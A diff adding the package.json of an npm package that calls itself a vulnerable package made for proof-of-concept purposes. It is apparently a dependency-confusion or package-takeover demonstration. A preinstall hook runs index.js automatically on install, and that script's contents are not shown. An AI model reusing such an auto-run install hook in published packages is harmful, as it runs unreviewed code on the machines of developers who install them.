@@ -1,0 +1,12 @@
+{
+  "name": "@hellotry2/goutils",
+  "version": "0.0.1",
+  "description": "This is vulnerable package, i made it for POC purposes",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node index.js"
+  },
+  "keywords": [],
+  "author": "Takeover",
+  "license": "ISC"
+}
